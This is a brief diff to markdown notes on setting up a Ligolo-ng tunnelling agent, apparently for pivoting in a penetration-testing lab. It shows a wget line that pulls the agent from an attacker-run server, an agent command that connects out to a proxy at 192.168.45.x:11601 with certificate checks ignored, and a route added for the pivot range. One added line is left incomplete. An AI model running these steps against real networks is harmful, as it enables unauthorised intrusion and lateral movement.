@@ -38,9 +38,10 @@ wget http://ip:8000/agent
 
 ### connect to proxy 
 ```
-./agent -connect 192.168.45.x:11601 -ignore-cert
+./agent.exe -connect 192.168.45.x:11601 -ignore-cert
 ```
 
+if cannot connec
 ### chose session id
 ```
 session
@@ -48,6 +49,7 @@ session
 ```
 
 ### add route
+open another terminal and add pivot ip range
 ```
 sudo ip route add ip/24 dev ligolo
 ```
